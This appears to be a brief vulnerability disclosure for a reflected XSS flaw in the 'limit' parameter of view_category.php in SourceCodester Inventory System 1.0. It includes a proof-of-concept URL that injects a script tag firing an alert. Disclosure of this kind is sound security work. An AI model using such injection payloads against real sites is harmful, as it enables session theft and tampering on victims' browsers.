# Reflected XSS in Inventory System (View Category)
...
* **Version**: 1.0
* **Component**: View Category (`view_category.php`)
* **Vulnerable Parameter**: `limit` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `view_category.php` file.
...
```
http://127.0.0.1:8089/view_category.php?limit=%22%3E%3Cscript%3Ealert(15623);%3C/script%3E
...
<img width="1062" height="735" alt="图片" src="https://github.com/user-attachments/assets/6deeeb1a-ed30-4b68-8981-af1a179b033b" />
